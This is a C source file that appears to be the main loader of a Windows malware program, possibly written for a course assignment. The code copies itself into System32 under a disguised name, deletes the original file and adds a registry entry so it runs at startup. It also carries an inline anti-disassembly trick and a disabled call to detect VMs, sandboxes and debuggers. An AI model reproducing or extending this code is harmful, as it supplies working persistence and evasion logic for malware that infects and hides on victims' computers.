
#include "program/program.h"
#include "persistence/registry.h"
#include "env_detection/env_detector.h"

#include <stdio.h>

// give our malware a very unsuspicious name :)
#define EXEC_PATH "C:\\Windows\\System32\\JamesBond.exe"

#define FIRST_RUN_FROM_SYS32 "-007"
#define RUN_FROM_REGISTRY    "-008"


static void copyToSys32AndLaunch(char** argv);
static void runFromRegistry(char** argv);
static void firstRunFromSys32(char** argv);
static void run();

static void check();

WINBOOL is64BitMachine;

int main(int argc, char** argv) {
    check();

    // anti-dissassembly technique
    // jump-1 -> dec eax -> inc eax
    __asm__ __volatile__ (
        ".byte 0xEB, 0xFF\n\t"
        ".byte 0xC0, 0x48\n\t"
    );


    // detect vms, sandboxes, and debuggers!
    // RET_CODE ret = detectAnalysisTools();

    // if (ret != R_SAFE_RET) {
    //     printf("RET: %s", getRetMessage(ret));
    //     exit(1);
    // }


    // retrieve the bitness of the client computer,  returns true if the current 
    // process is being run by the 32-bit emulator on a windows 64-bit machine

    PVOID __tmp__;
    // returns true on if our 32-bit process is running in a 64-bit machine 
    is64BitMachine = Wow64DisableWow64FsRedirection(&__tmp__);
    printf("is64BitMachine? %d\n", is64BitMachine);

    switch (argc) {
        case 1:  // launched for the first time
            copyToSys32AndLaunch(argv);
            break;
        case 2:  // run from the registry key 
            runFromRegistry(argv);
            break;
        case 3:  // run from the copy and launch
            firstRunFromSys32(argv);
            break;
    }

    Wow64RevertWow64FsRedirection(__tmp__);
    exit(0);
}

static void copyToSys32AndLaunch(char** argv) {
    char* path = argv[0];
    char buffer[__UINT16_MAX__];   // 64 kilobytes
    
    HANDLE hSource = CreateFileA(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE hDest = CreateFileA(EXEC_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    DWORD bytesRead;
    while (ReadFile(hSource, buffer, __UINT16_MAX__, &bytesRead, NULL) && bytesRead > 0) {
        if (!WriteFile(hDest, buffer, bytesRead, NULL, NULL)) {
            break;
        }
    }

    CloseHandle(hSource);
    CloseHandle(hDest);

    printf("Created SYS32 Executable..\n");

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // pass the token to our privileged process!, NULL, as well as the command to be executed
    // the NULL lets use us the command line
    char cmd[MAX_PATH];
    snprintf(cmd, MAX_PATH, "\"%s\" %s \"%s\"", EXEC_PATH, FIRST_RUN_FROM_SYS32, path);

    BOOL ret = CreateProcessA(
        NULL, cmd,
        NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi
    );

    if(!ret) exit(1);
    printf("Exiting worker...\n");
}

static void runFromRegistry(char** argv) {
    char* path = argv[0];
    char* arg = argv[1];
    if (strcmp(path, EXEC_PATH) != 0 || strcmp(arg, RUN_FROM_REGISTRY) != 0) {
        return;
    }

    Sleep(30000);
    run();
}

static void firstRunFromSys32(char** argv) {
    char* path = argv[0];
    char* arg = argv[1];
    char* delPath = argv[2];

    if (strcmp(path, EXEC_PATH) != 0 || strcmp(arg, FIRST_RUN_FROM_SYS32) != 0) {
        exit(0);
    }

    // delete the orignal malware file!
    DeleteFileA(delPath);
    printf("Deleting %s...", path);
    
    // check for 64 bit machine, add the KEY_WOW64_64KEY flag if we are in one
    LONG access = KEY_WRITE;
    if (is64BitMachine) {
        access |= KEY_WOW64_64KEY;
    }

    RET_CODE ret = generateRegKey(EXEC_PATH, RUN_FROM_REGISTRY, access);
    if (ret != R_SUCCESS) {
        printf("Failed to generate registry key.\n");
    }

    run();
}

static void run() {
    RET_CODE ret = setup();
    if (ret != R_SUCCESS) {
        printErr(ret);
        programCleanup();
        return;
    }

    ret = startThreads();
    printf("Cleaning up.\nProgram exited with msg: %s", getRetMessage(ret));
    programCleanup();
}




// ------------------------
// remove before submission
// ------------------------
void check() {   // just ensuring if I accidently run it then it doesn't infect me lol
    DWORD size = UNLEN + 1;
    char buffUser[size];
    if (!GetUserNameA(buffUser, &size)) { exit(1); }

    if (strcmp(buffUser, "louis") == 0) {
        exit(0);
    }
}